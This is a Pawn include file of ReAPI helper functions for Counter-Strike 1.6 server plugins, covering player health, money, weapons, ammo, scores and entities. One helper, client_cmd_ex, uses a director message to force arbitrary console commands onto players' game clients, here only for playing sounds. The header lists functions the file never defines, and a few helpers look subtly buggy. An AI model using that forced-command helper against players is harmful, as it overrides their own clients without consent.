// Copyright © 2017-XXXX Vaqtincha

// Update 21.08.2022 (Huehue):
/* Added:
			rg_get_user_health()
			rg_add_user_health()
			rg_set_user_heath()
			rg_is_user_first_spawn()
			rg_is_one_on_one()
			rg_transfer_money()
			rg_play_user_sound()
			client_cmd_ex()
			rg_get_team_score_diff()
			rg_get_team_count_diff()
			rg_set_entity_model()
			rg_remove_entity()
			rg_create_explode_grenade()
			rg_set_entity_skin()
			rg_get_entity_skin()
			rg_get_user_noclip()
			rg_get_user_godmode()
			is_user_vip()
			is_happy_hour()
			rg_get_user_gravity()
			rg_send_hudmessage()
			try_precache_player_model()
			UTIL_CheckServerLicense()


*/

#if defined _reapi_stocks_included
	#endinput
#endif

#define _reapi_stocks_included

#if !defined _reapi_included
	#include <reapi>
#endif


const GRENADES_BIT_SUM = ((1<<_:WEAPON_HEGRENADE)|(1<<_:WEAPON_SMOKEGRENADE)|(1<<_:WEAPON_FLASHBANG))
const NOCLIP_WEAPONS_BIT_SUM = (GRENADES_BIT_SUM|(1<<_:WEAPON_KNIFE)|(1<<_:WEAPON_C4))
const SECONDARY_WEAPONS_BIT_SUM = ((1<<_:WEAPON_P228)|(1<<_:WEAPON_ELITE)|(1<<_:WEAPON_FIVESEVEN)|(1<<_:WEAPON_USP)|(1<<_:WEAPON_GLOCK18)|(1<<_:WEAPON_DEAGLE))
const PRIMARY_WEAPONS_BIT_SUM = 
(
	(1<<_:WEAPON_SCOUT)|(1<<_:WEAPON_XM1014)|(1<<_:WEAPON_MAC10)|(1<<_:WEAPON_AUG)|(1<<_:WEAPON_UMP45)|(1<<_:WEAPON_SG550)
	|(1<<_:WEAPON_GALIL)|(1<<_:WEAPON_FAMAS)|(1<<_:WEAPON_AWP)|(1<<_:WEAPON_MP5N)|(1<<_:WEAPON_M249)|(1<<_:WEAPON_M3)
	|(1<<_:WEAPON_M4A1)|(1<<_:WEAPON_TMP)|(1<<_:WEAPON_G3SG1)|(1<<_:WEAPON_SG552)|(1<<_:WEAPON_AK47)|(1<<_:WEAPON_P90)
)


enum GiveAmmoType
{
	GAT_GIVE_AMMO,
	GAT_SET_AMMO
}

enum AmmoTypes
{
	AMMO_NONE,
	AMMO_338MAGNUM,
	AMMO_762NATO,
	AMMO_556NATOBOX,
	AMMO_556NATO,
	AMMO_BUCKSHOT,
	AMMO_45ACP,
	AMMO_57MM,
	AMMO_50AE,
	AMMO_357SIG,
	AMMO_9MM,
	AMMO_FLASHBANG,
	AMMO_HEGRENADE,
	AMMO_SMOKEGRENADE,
	AMMO_C4,

	AMMO_MAX_TYPES
}

enum /* RewardAccount */ 		// from gamerules.h
{
	REWARD_TARGET_BOMB			= 3500,
	REWARD_VIP_ESCAPED			= 3500,
	REWARD_VIP_ASSASSINATED		= 3250,
	REWARD_TERRORISTS_ESCAPED	= 3150,
	REWARD_CTS_PREVENT_ESCAPE	= 3500,
	REWARD_ESCAPING_TT_NEUTRALIZED	= 3250,
	REWARD_BOMB_DEFUSED			= 3250,
	REWARD_BOMB_PLANTED			= 800,
	REWARD_BOMB_EXPLODED		= 3250,
	REWARD_CTS_WIN				= 3000,
	REWARD_TERRORISTS_WIN		= 3000,
	REWARD_ALL_HOSTAGES_RESCUED	= 2500,
	REWARD_TARGET_BOMB_SAVED	= 3250,
	REWARD_HOSTAGE_NOT_RESCUED	= 3250,
	REWARD_VIP_NOT_ESCAPED		= 3250,
	REWARD_LOSER_BONUS_DEFAULT	= 1400,
	REWARD_LOSER_BONUS_MIN		= 1500,
	REWARD_LOSER_BONUS_MAX		= 3000,
	REWARD_LOSER_BONUS_ADD		= 500,
	REWARD_RESCUED_HOSTAGE		= 750,
	// REWARD_KILLED_ENEMY			= 300,
	// REWARD_KILLED_VIP			= 2500,
	// REWARD_VIP_HAVE_SELF_RESCUED = 2500,
	// REWARD_TAKEN_HOSTAGE			= 1000,
	REWARD_TOOK_HOSTAGE_ACC		= 100,
	REWARD_TOOK_HOSTAGE			= 150,
}

enum
{
    WEATHER_NONE = 0,
    WEATHER_RAIN,
    WEATHER_SNOW
}


#define rg_is_valid_weapon_id(%1)		(WEAPON_P228 <= %1 <= WEAPON_P90 && %1 != WEAPON_GLOCK)
#define rg_is_primary_weapon_id(%1)		(PRIMARY_WEAPONS_BIT_SUM & (1 << any:%1))
#define rg_is_secondary_weapon_id(%1)	(SECONDARY_WEAPONS_BIT_SUM & (1 << any:%1))
#define rg_is_grenade_weapon_id(%1)		(GRENADES_BIT_SUM & (1 << any:%1))
#define rg_is_noclip_weapon_id(%1)		(NOCLIP_WEAPONS_BIT_SUM & (1 << any:%1))

#define rg_is_valid_slot_type(%1)		(PRIMARY_WEAPON_SLOT <= %1 <= C4_SLOT)
#define rg_is_valid_armoury(%1)			(ARMOURY_MP5NAVY <= %1 <= ARMOURY_DEAGLE)

#define rg_is_valid_rule_id(%1)			(RR_CTS_WIN <= %1 < RR_END)
#define rg_is_valid_ammo_id(%1)			(AMMO_338MAGNUM <= %1 < AMMO_MAX_TYPES)
#define rg_is_valid_team(%1)			(TEAM_TERRORIST <= get_member(%1, m_iTeam) <= TEAM_CT)

#define get_bit(%1,%2)       			(%1 & (1 << (%2 & 31)))
#define set_bit(%1,%2)        			(%1 |= (1 << (%2 & 31)))
#define reset_bit(%1,%2)    			(%1 &= ~(1 << (%2 & 31)))
#define invert_bit(%1,%2)    			(%1 ^= (1 << (%2 & 31)))
#define rset_bit(%1,%2,%3) 				(%3 && (%1 |= (1 << (%2 & 31))) || (%1 &= ~(1 << (%2 & 31)))) // Reset & Set Bit directly

#define IsNullVector(%0) bool:((%0[0] + %0[1] + %0[2]) == 0.0)
#define IsNullString(%0) bool:(%0[0] == EOS)

#define CLIENT_IN_DUCK					15.0
#define CLIENT_NOT_IN_DUCK 				35.0

//#define XYZ 							3
//#define X								0
//#define Y								1
//#define Z 								2

enum _:XYZ {
	Float:X,Float:Y,Float:Z
};

enum _:RGB {
    Float:R,Float:G,Float:B
};

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Other stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/


// by s1lent
stock rg_map_buy_status(bool:enabled)
{
	new pBuyzone = NULLENT, count
	while((pBuyzone = rg_find_ent_by_class(pBuyzone, "func_buyzone", .useHashTable = true)))
	{
		set_entvar(pBuyzone, var_solid, enabled ? SOLID_TRIGGER : SOLID_NOT)
		count++
	}

	// old
	if(!count) 
	{
		set_member_game(m_bCTCantBuy, enabled)
		set_member_game(m_bTCantBuy, enabled)
	}
}


// change roundtime
stock rg_set_round_time(const newTime) 
{
	new iRoundTime = clamp(newTime, 0, 999)

	set_member_game(m_fRoundStartTime, get_gametime())
	set_member_game(m_iRoundTimeSecs, iRoundTime)

	static gmsgShowTimer, gmsgRoundTime
	if(gmsgShowTimer || (gmsgShowTimer = get_user_msgid("ShowTimer")))
	{
		message_begin(MSG_ALL, gmsgShowTimer)
		message_end()
	}
	
	if(gmsgRoundTime || (gmsgRoundTime = get_user_msgid("RoundTime")))
	{
		message_begin(MSG_ALL, gmsgRoundTime)
		write_short(iRoundTime)
		message_end()
	}
}

stock bool:rg_freezetime_ended(){
	return !get_member_game(m_bFreezePeriod)
}

stock bool:rg_map_has_bombtarget(){
	return get_member_game(m_bMapHasBombTarget)
}

stock bool:rg_buytime_expired() 
{
	static mp_buytime
	if(mp_buytime || (mp_buytime = get_cvar_pointer("mp_buytime")))
	{
		new Float:flBuyTime = get_pcvar_float(mp_buytime)
		if(flBuyTime == -1.0) {  		// no limit
			return false
		}
		if(flBuyTime == 0.0 || (get_gametime() - Float:get_member_game(m_fRoundStartTime) > (flBuyTime * 60))) {
			return true
		}
	}

	return false
}

stock rg_set_round_winner(const WinStatus:st, const iAddPoints = 1)
{
	new ScenarioEventEndRound:Event, ctScore, ttScore
	switch(st)
	{
		case WINSTATUS_CTS: {
			Event = ROUND_CTS_WIN
			ctScore = iAddPoints
		}
		case WINSTATUS_TERRORISTS: {
			Event = ROUND_TERRORISTS_WIN
			ttScore = iAddPoints
		}
		case WINSTATUS_DRAW: {
			Event = ROUND_NONE
		}
		default:return
	}

	rg_round_end(5.0, st, Event)

	if(Event != ROUND_NONE && (ctScore || ttScore)) {
		rg_update_teamscores(ctScore, ttScore)
	}
}

// RR_END  = reset all rules
stock rg_reset_account_rules(RewardRules:iRulesID = RR_END)
{
	static const rgRewardAccountRules[any:RR_END] = {
		REWARD_CTS_WIN,						// RR_CTS_WIN
		REWARD_TERRORISTS_WIN,				// RR_TERRORISTS_WIN
		REWARD_TARGET_BOMB,					// RR_TARGET_BOMB
		REWARD_VIP_ESCAPED,					// RR_VIP_ESCAPED
		REWARD_VIP_ASSASSINATED,			// RR_VIP_ASSASSINATED
		REWARD_TERRORISTS_ESCAPED,			// RR_TERRORISTS_ESCAPED
		REWARD_CTS_PREVENT_ESCAPE,			// RR_CTS_PREVENT_ESCAPE
		REWARD_ESCAPING_TT_NEUTRALIZED,		// RR_ESCAPING_TERRORISTS_NEUTRALIZED
		REWARD_BOMB_DEFUSED,				// RR_BOMB_DEFUSED
		REWARD_BOMB_PLANTED,				// RR_BOMB_PLANTED
		REWARD_BOMB_EXPLODED,				// RR_BOMB_EXPLODED
		REWARD_ALL_HOSTAGES_RESCUED,		// RR_ALL_HOSTAGES_RESCUED
		REWARD_TARGET_BOMB_SAVED,			// RR_TARGET_BOMB_SAVED
		REWARD_HOSTAGE_NOT_RESCUED,			// RR_HOSTAGE_NOT_RESCUED
		REWARD_VIP_NOT_ESCAPED,				// RR_VIP_NOT_ESCAPED
		REWARD_LOSER_BONUS_DEFAULT,			// RR_LOSER_BONUS_DEFAULT
		REWARD_LOSER_BONUS_MIN,				// RR_LOSER_BONUS_MIN
		REWARD_LOSER_BONUS_MAX,				// RR_LOSER_BONUS_MAX
		REWARD_LOSER_BONUS_ADD,				// RR_LOSER_BONUS_ADD
		REWARD_RESCUED_HOSTAGE,				// RR_RESCUED_HOSTAGE
		REWARD_TOOK_HOSTAGE_ACC,			// RR_TOOK_HOSTAGE_ACC
		REWARD_TOOK_HOSTAGE					// RR_TOOK_HOSTAGE
	}

	if(rg_is_valid_rule_id(iRulesID))
	{
		rg_set_account_rules(iRulesID, rgRewardAccountRules[iRulesID])
	}
	else if(iRulesID == RR_END)
	{
		for(iRulesID = RR_CTS_WIN; iRulesID < RR_END; iRulesID++)
		{
			rg_set_account_rules(iRulesID, rgRewardAccountRules[iRulesID])
		}
	}
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Player stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

stock Float:rg_get_user_health(const player) {
	return Float:get_entvar(player, var_health)
}

stock rg_add_user_health(const player, const Float:hp, Float:fMins = 1.0, Float:fMaxs = 100.0, bool:ClampHp = false) {
	if (ClampHp)
		set_entvar(player, var_health, floatclamp((rg_get_user_health(player) + hp), fMins, fMaxs))
	else
		set_entvar(player, var_health, rg_get_user_health(player) + hp)
}

stock rg_set_user_health(const player, const Float:hp) {
	set_entvar(player, var_health, hp)
}

stock rg_set_user_noclip(const player, bool:noclip) {
	set_entvar(player, var_movetype, noclip ? MOVETYPE_NOCLIP : MOVETYPE_WALK)
}

stock bool:rg_get_user_noclip(const player) {
	return bool:(get_entvar(player, var_movetype) == MOVETYPE_NOCLIP)
}

stock rg_set_user_godmode(const player, bool:godmode) {
	set_entvar(player, var_takedamage, godmode ? DAMAGE_NO : DAMAGE_YES)
}

stock bool:rg_get_user_godmode(const player) {
	return bool:(get_entvar(player, var_takedamage) == DAMAGE_NO)
}

stock is_user_vip(const player, const flag) {
	return (get_user_flags(player) & flag)
}

stock bool:is_happy_hour(const start, const end)
{
	static hour
	time(hour)

	return bool:(start < end ? (start <= hour < end) : (start <= hour || hour < end))
}

/**
    * Check if it is the first spawn of the player
    *   @NOTE: by Emma Jule
    *
    *
    *   @return     bool
*/
stock bool:rg_is_user_first_spawn(const player) {
	return bool:(get_member(player, m_iNumSpawns) == 1)
}

stock bool:rg_is_one_on_one() {
	new iAliveTs, iAliveCTs
	rg_initialize_player_counts(iAliveTs, iAliveCTs)

	return bool:(iAliveTs == 1 && iAliveCTs == 1)
}

stock bool:rg_is_last_player_terrorist() {
	new iAliveTs
	rg_initialize_player_counts(iAliveTs)

	return bool:(iAliveTs == 1)
}

stock bool:rg_is_last_player_ct() {
	new iAliveTs, iAliveCTs
	rg_initialize_player_counts(iAliveTs, iAliveCTs)

	return bool:(iAliveCTs == 1)
}

stock bool:rg_is_last_player() {
	new iAliveTs, iAliveCTs
	rg_initialize_player_counts(iAliveTs, iAliveCTs)

	return bool:((iAliveTs == 1 && iAliveCTs > 1) || (iAliveCTs == 1 && iAliveTs > 1))
}

stock rg_transfer_money(const player, const sender, const amount, bool:bTrackChange = false) {
	rg_take_user_money(player, amount, bTrackChange)
	rg_give_user_money(sender, amount, bTrackChange)
}

stock rg_play_user_sound(const player = 0, const sound[], bool:bStopSound = false) {
	if (bStopSound)
		client_cmd_ex(player, "mp3 stop;stopsound")

	if (containi(sound, ".mp3") != -1)
	{
		if (containi(sound, "sound/") != -1)
			client_cmd_ex(player, "mp3 play ^"%s^"", sound)
		else
			client_cmd_ex(player, "mp3 play ^"sound/%s^"", sound)
	}
	else
		client_cmd_ex(player, "spk ^"%s^"", sound)
}

stock client_cmd_ex(id, const command[], any:...)
{
	#pragma unused command
	
	if (id == 0 || is_user_connected(id))
	{
		new szMessage[256]
		
		format_args(szMessage, charsmax(szMessage), 1)
		
		message_begin(id == 0 ? MSG_ALL : MSG_ONE, 51, _, id)
		write_byte(strlen(szMessage) + 2)
		write_byte(10)
		write_string(szMessage)
		message_end()
	}
}

/*
 Similar to GodMode
*/
stock rg_set_user_taketamage(const player, bool:take) {
	set_entvar(player, var_takedamage, take ? DAMAGE_AIM : DAMAGE_NO)
}

stock Float:rg_get_user_maxspeed(const player) {
	return Float:get_entvar(player, var_maxspeed)
}
/* Sets player max. speed. 
*/
stock rg_set_user_maxspeed(const player, Float:speed = -1.0)
{
	if(speed != -1) // reset
		set_entvar(player, var_maxspeed, speed)
	else
		rg_reset_maxspeed(player)		
}

/* Sets player gravity.
*/
stock rg_set_user_gravity(const player, Float:gravity = 1.0) {
	set_entvar(player, var_gravity, gravity)
}

stock rg_get_user_gravity(const player) {
	return Float:get_entvar(player, var_gravity)
}

stock rg_set_user_unlimited_ammo(id, bool:unlimited = true) {
	set_member(id, m_iWeaponInfiniteAmmo, unlimited ? 1 : 0)
}

/* Returns in bitwise (see enum SignalState) form if the user is in a specific map zone.
*/
stock SignalState:rg_get_user_mapzones(const player)
{
	new iSignals[UnifiedSignals]
	get_member(player, m_signals, iSignals)

	return SignalState:iSignals[US_State]	
}

stock bool:rg_user_in_buyzone(const player) {
	return bool:(rg_get_user_mapzones(player) & SIGNAL_BUY)
}

stock bool:rg_user_in_bombzone(const player) {
	return bool:((rg_get_user_mapzones(player) & SIGNAL_BOMB) == SIGNAL_BOMB)
}

stock bool:rg_user_in_water(const player) {
	return bool:(get_entvar(player, var_waterlevel) > 0)
}

stock bool:rg_user_on_ladder(const player) {
	return bool:(get_entvar(player, var_movetype) == MOVETYPE_FLY)
}

stock bool:rg_get_user_invisibility(const player) {
	return bool:(get_entvar(player, var_effects) & EF_NODRAW)
}

/*stock rg_set_user_invisibility(const player, bool:hide = true) {
	new iFlags = get_entvar(player, var_effects)
	set_entvar(player, var_effects, hide ? (iFlags |= EF_NODRAW) : (iFlags &= ~EF_NODRAW))
}*/

stock rg_set_user_invisibility_ex(id, bool:invisible = false)
{
	if (invisible)
	{
		set_entvar(id, var_effects, get_entvar(id, var_effects) | EF_NODRAW)
	}
	else
	{
		set_entvar(id, var_effects, get_entvar(id, var_effects) & ~EF_NODRAW)
	}
}

/**
    * Check the WIN differences between CTs and Terrorists
    *   @NOTE: by Emma Jule
    *
    *
    *   @return     int
*/
stock rg_get_team_score_diff() {
	return abs(get_member_game(m_iNumTerroristWins) - get_member_game(m_iNumCTWins));
}

/**
    * Check the team count differences between CTs and Terrorists
    *   @NOTE: by Emma Jule
    *
    *
    *   @return     int
*/
stock rg_get_team_count_diff() {
	return abs(get_member_game(m_iNumTerrorist) - get_member_game(m_iNumCT));
}


stock rg_get_user_money(const player) {
	return get_member(player, m_iAccount)
}

stock rg_set_user_money(const player, amount, const bool:bTrackChange = true) {
	rg_add_account(player, rg_get_user_money(player) + amount, AS_SET, bTrackChange)
}

stock rg_give_user_money(const player, amount, const bool:bTrackChange = true) {
	rg_add_account(player, amount, AS_ADD, bTrackChange)
}

stock rg_take_user_money(const player, amount, const bool:bTrackChange = true) {
	rg_add_account(player, -amount, AS_ADD, bTrackChange)
}

stock rg_get_user_next_spraytime(const player, Float:time) {
	set_member(player, m_flNextDecalTime, get_gametime() + time)
}

stock rg_set_user_sprayframe(const player, frames = -1) {
	set_member(player, m_nCustomSprayFrames, frames)
}

// Adidasman
stock rg_skip_user_vguimenu(const player) {
	set_member(player, m_bForceShowMenu, true)
}

stock rg_get_user_deaths(const player) {
	return get_member(player, m_iDeaths)
}

stock rg_get_user_frags(const player) {
	return get_entvar(player, var_frags)
}

stock rg_set_user_score(const player, frags, deaths, bool:bUpdateTabScore = true) {
	set_entvar(player, var_frags, float(frags))
	set_member(player, m_iDeaths, deaths)

	if (bUpdateTabScore)
	{
		// Update tabscore
		message_begin(MSG_BROADCAST, get_user_msgid("ScoreInfo"))
		write_byte(player)
		write_short(frags)	// Frags
		write_short(deaths)	// Deaths
		write_short(0)
		write_short(get_user_team(player))
		message_end()
	}
}

stock rg_reset_user_score(const player, bool:bUpdateTabScore = true) {
	set_entvar(player, var_frags, 0)
	set_member(player, m_iDeaths, 0)

	if (bUpdateTabScore)
	{
		// Update tabscore
		message_begin(MSG_BROADCAST, get_user_msgid("ScoreInfo"))
		write_byte(player)
		write_short(0)	// Frags
		write_short(0)	// Deaths
		write_short(0)
		write_short(get_user_team(player))
		message_end()
	}
}

stock bool:rg_is_user_joined(const player) {
	return bool:(get_member(player, m_iJoiningState) == JOINED)
}

/* Returns true user has blinded.
*/
stock bool:rg_is_user_blinded(const player) {
	return bool:(Float:get_member(player, m_blindStartTime) + Float:get_member(player, m_blindFadeTime) >= get_gametime())
}

// original code by ConnorMcLeod 2011 (see: https://forums.alliedmods.net/showpost.php?p=1612876&postcount=2)

stock rg_get_user_blind_percent(const player)
{
	static const BLINDED_FULLY = 255
	#define fPercent(%1,%2) 	100.0 - (((%1) * 100.0) / %2)

	new Float:flCurTime = get_gametime(),
		Float:flBlindStartTime = Float:get_member(player, m_blindStartTime),
		Float:flBlindHoldTime = Float:get_member(player, m_blindHoldTime),
		Float:flBlindFadeTime = Float:get_member(player, m_blindFadeTime),
		Float:flEndTime = flBlindFadeTime + flBlindHoldTime

	if((flCurTime - flBlindStartTime) > flEndTime)
		return 0

	if(get_member(player, m_blindAlpha) == BLINDED_FULLY)
	{
		if((flBlindStartTime + flBlindHoldTime) >= flCurTime)
			return 100 		// 100 percent

		return floatround(fPercent(flCurTime - (flBlindStartTime + flBlindHoldTime), flBlindFadeTime))
	}
	
	return floatround(fPercent(flCurTime - flBlindStartTime, flEndTime))
}

/* return enum ModelName
*/
stock ModelName:rg_get_user_class(const player) {
	return get_member(player, m_iModelName)
}

stock TeamName:rg_get_user_team(const player, &{ModelName,_}:model = MODEL_UNASSIGNED) 
{
	model = rg_get_user_class(player)
	return TeamName:get_member(player, m_iTeam)
}


/* Does user have night vision goggles?
 */
stock rg_get_user_nvg(const player) {
	return get_member(player, m_bHasNightVision)
}

/* Set nvgoggles to 1 to give night vision goggles to index. Set it to 0 to remove them.
 */
stock rg_set_user_nvg(const player, bool:nvgoggles = true) {
	set_member(player, m_bHasNightVision, nvgoggles)
}

stock bool:rg_user_has_defuser(const player) {
	return bool:(get_member(player, m_bHasDefuser))
}

/* return enum HitBoxGroup 
*/
stock HitBoxGroup:rg_get_user_last_hitgroup(const player) {
	return get_member(player, m_LastHitGroup)
}

stock bool:rg_user_killed_by_headshot(const player) {
	return bool:(rg_get_user_last_hitgroup(player) == HITGROUP_HEAD || get_member(player, m_bHeadshotKilled))
}

/* Returns true if user has a shield, else false.
*/
stock bool:rg_user_has_shield(const player, &bool:bShieldDrawn = false)
{
	if(get_member(player, m_bOwnsShield)) 
	{
		bShieldDrawn = get_member(player, m_bShieldDrawn)
		return true
	}

	return false
}

stock bool:rg_user_has_secondary(const player) {
	return bool:(get_member(player, m_rgpPlayerItems, PISTOL_SLOT) > 0)
}

/* Returns 1 when user has a primary weapon OR a shield in inventory, else 0.
*/
stock bool:rg_user_has_primary(const player) {
	return bool:((get_member(player, m_rgpPlayerItems, PRIMARY_WEAPON_SLOT) > 0) || get_member(player, m_bHasPrimary))
}

stock rg_set_user_can_shot(const player, bool:can = true) {
	set_member(player, m_bIsDefusing, can)
}

stock rg_set_user_team_changed(const player, bool:changed = true) {
	set_member(player, m_bTeamChanged, changed)
}

stock rg_set_user_radio_message(const player, num) {
	set_member(player, m_iRadioMessages, num)
}

stock rg_set_user_ignore_radio(const player, bool:ignore = true) {
	set_member(player, m_bIgnoreRadio, !ignore)
}

stock WeaponIdType:rg_get_user_weapon(const player, InventorySlotType:iSlot, &pWeapon = NULLENT)
{
	if(!rg_is_valid_slot_type(iSlot))
		return WEAPON_NONE

	return ((pWeapon = get_member(player, m_rgpPlayerItems, iSlot)) > 0) ? rg_get_weapon_id(pWeapon) : WEAPON_NONE
}

stock WeaponIdType:rg_get_user_active_weapon(const player, &pWeapon = NULLENT) {
	return ((pWeapon = get_member(player, m_pActiveItem)) > 0) ? rg_get_weapon_id(pWeapon) : WEAPON_NONE
}

// Max = 0   default max (works with GAT_GIVE_AMMO)
stock rg_user_add_ammo(const player, AmmoTypes:AmmoId, Amount, Max = 0, GiveAmmoType:type = GAT_SET_AMMO, bool:bShowPickup = true)
{
	if(!rg_is_valid_ammo_id(AmmoId))
		return

	static const iMaxBpAmmo[AMMO_MAX_TYPES] = {
		0, 30, 90, 200, 90, 32, 100, 100, 35, 52, 120, 2, 1, 1, 1
	}
	
	new finalAmount, userAmmo, finalMax = (Max > 0 ? Max : iMaxBpAmmo[AmmoId])
	
	if(type == GAT_SET_AMMO)
	{
		set_member(player, m_rgAmmo, Amount, AmmoId)
		return
	}
	else if(type == GAT_GIVE_AMMO)
	{
		if(Amount <= 0 || ((userAmmo = get_member(player, m_rgAmmo, AmmoId)) >= finalMax))
			return

		set_member(player, m_rgAmmo, userAmmo + (finalAmount = min(finalMax, Amount)), AmmoId)
	}

	static gmsgAmmoPickup
	if(finalAmount && bShowPickup && (gmsgAmmoPickup || (gmsgAmmoPickup = get_user_msgid("AmmoPickup"))))
	{
		message_begin(MSG_ONE, gmsgAmmoPickup, .player = player)
		write_byte(any:AmmoId)
		write_byte(finalAmount)
		message_end()
	}
}

stock rg_send_weapon_anim(const player, const anim, const Float:fAnimTime, weapon = NULLENT) 
{
	if(weapon > 0 || (weapon = get_member(player, m_pActiveItem)) > 0)
	{
		set_entvar(player, var_weaponanim, anim)

		message_begin(MSG_ONE, SVC_WEAPONANIM, .player = player)
		write_byte(anim)
		write_byte(get_entvar(weapon, var_body))
		message_end()

		set_member(weapon, m_Weapon_flTimeWeaponIdle, fAnimTime)
	}	
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ WeaponBox stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

stock rg_kill_weaponbox(const weaponbox)
{
	if(!get_member(weaponbox, m_WeaponBox_bIsBomb))
	{
		set_entvar(weaponbox, var_nextthink, get_gametime() + 0.1)
		return
	}
	
	new pWeapon = get_member(weaponbox, m_WeaponBox_rgpPlayerItems, C4_SLOT)
	if(!is_nullent(pWeapon)) {
		set_entvar(pWeapon, var_flags, FL_KILLME)
	}

	set_entvar(weaponbox, var_flags, FL_KILLME)

	static gmsgBombPickup
	if(gmsgBombPickup || (gmsgBombPickup = get_user_msgid("BombPickup")))
	{
		message_begin(MSG_ALL, gmsgBombPickup)
		message_end()
	}
}
	
// alternate native WeaponIdType:rg_get_weaponbox_id(const entity)

stock WeaponIdType:rg_get_weaponbox_weapon(const weaponbox, InventorySlotType:iSlot, &pWeapon = NULLENT)
{
	if(!rg_is_valid_slot_type(iSlot))
		return WEAPON_NONE

	return ((pWeapon = get_member(weaponbox, m_WeaponBox_rgpPlayerItems, iSlot)) > 0) ? rg_get_weapon_id(pWeapon) : WEAPON_NONE
}

stock rg_get_weaponbox_ammo(const weaponbox) {
	return get_member(weaponbox, m_WeaponBox_rgAmmo, rg_is_grenade_weapon_id(rg_get_weaponbox_id(weaponbox)) ? 1 : 0)
}

stock rg_set_weaponbox_ammo(const weaponbox, const AmmoTypes:AmmoId, const iCount)
{
	if(!rg_is_valid_ammo_id(AmmoId))
		return

	static const szAmmoTypes[AMMO_MAX_TYPES][] = {
		"", "338Magnum", "762Nato", "556NatoBox", "556Nato", "buckshot", "45acp", "57mm", 
		"50AE", "357SIG", "9mm", "Flashbang", "HEGrenade", "SmokeGrenade", "C4"
	}

	new element = rg_is_grenade_weapon_id(rg_get_weaponbox_id(weaponbox)) ? 1 : 0

	set_member(weaponbox, m_WeaponBox_rgiszAmmo, szAmmoTypes[AmmoId], element)
	set_member(weaponbox, m_WeaponBox_rgAmmo, (iCount < 0) ? 0 : iCount, element)
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Weapon stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

// rg_get_weapon_info() WI_SLOT
stock InventorySlotType:rg_get_weapon_slot(const weapon) {
	return (weapon > 0) ? rg_get_weaponid_slot(rg_get_weapon_id(weapon)) : NONE_SLOT
}

stock InventorySlotType:rg_get_weaponid_slot(const WeaponIdType:weaponid) 
{
	static const InventorySlotType:iWeaponsSlots[any:WEAPON_P90 + 1] = {
		NONE_SLOT,
		PISTOL_SLOT,
		NONE_SLOT,
		PRIMARY_WEAPON_SLOT,
		GRENADE_SLOT,
		PRIMARY_WEAPON_SLOT,
		C4_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		GRENADE_SLOT,
		PISTOL_SLOT,
		PISTOL_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PISTOL_SLOT,
		PISTOL_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		GRENADE_SLOT,
		PISTOL_SLOT,
		PRIMARY_WEAPON_SLOT,
		PRIMARY_WEAPON_SLOT,
		KNIFE_SLOT,
		PRIMARY_WEAPON_SLOT
	}
	
	return rg_is_valid_weapon_id(weaponid) ? iWeaponsSlots[weaponid] : NONE_SLOT
}

stock WeaponIdType:rg_get_weapon_id(const weapon) {
	return get_member(weapon, m_iId)
}

stock WeaponState:rg_get_weapon_state(const weapon) {
	return get_member(weapon, m_Weapon_iWeaponState)
}

stock WeaponState:rg_get_weapon_owner(const weapon) {
	return get_member(weapon, m_pPlayer)
}

stock rg_set_weapon_can_shot(const weapon, bool:can = true) {
	set_member(weapon, m_Weapon_iWeaponState, (can ? (any:0) : WPNSTATE_SHIELD_DRAWN))
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Armoury entity stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

// -1 = all armoury items
stock rg_invisibility_armoury(const ArmouryItemPack:itemID = any:-1, bool:visible = false)
{
	new pArmoury = NULLENT
	while((pArmoury = rg_find_ent_by_class(pArmoury, "armoury_entity", .useHashTable = true)))
	{
		if(itemID != any:-1 && itemID != get_member(pArmoury, m_Armoury_iItem))
			continue

		if(!visible)
		{
			set_entvar(pArmoury, var_effects, get_entvar(pArmoury, var_effects) | EF_NODRAW)
			set_entvar(pArmoury, var_solid, SOLID_NOT)
		}
		else
		{
			set_entvar(pArmoury, var_effects, get_entvar(pArmoury, var_effects) & ~EF_NODRAW)
			set_entvar(pArmoury, var_solid, SOLID_TRIGGER)
		}
	}
}

/* To get ArmouryItem ID from armoury_entity
*
* @param entity		armoury_entity
* @param count		count item
* @return			return enum's of ArmouryItemPack
*/
stock ArmouryItemPack:rg_get_armoury_info(const entity, &count = 1)
{
	new ArmouryItemPack:item = get_member(entity, m_Armoury_iItem)
	if(!rg_is_valid_armoury(item))
		return any:-1

	count = get_member(entity, m_Armoury_iCount)
	return item
}

/* Set an armoury_entity to be of specified type.
*/
stock bool:rg_set_armoury_type(const entity, const ArmouryItemPack:item)
{
	if(!rg_is_valid_armoury(item))
		return false

	set_member(entity, m_Armoury_iItem, item)
	return true
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Other entity stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

/* Sets the submodel setting of the entity.
* If this is 1, then the user has a backpack or defuser on their model (depending on team)
* 0 removes it.
*/
stock rg_set_entity_submodel(const entity, const value) {
	set_entvar(entity, var_body, value)
}

stock rg_get_entity_submodel(const entity) {
	return get_entvar(entity, var_body)
}

stock rg_set_entity_skin(const entity, const value) {
	set_entvar(entity, var_skin, value)
}

stock rg_get_entity_skin(const entity) {
	return get_entvar(entity, var_skin)
}

stock rg_set_entity_model(const entity, const model[], const modelindex) {
	set_entvar(entity, var_model, model)
	set_entvar(entity, var_modelindex, modelindex)
}

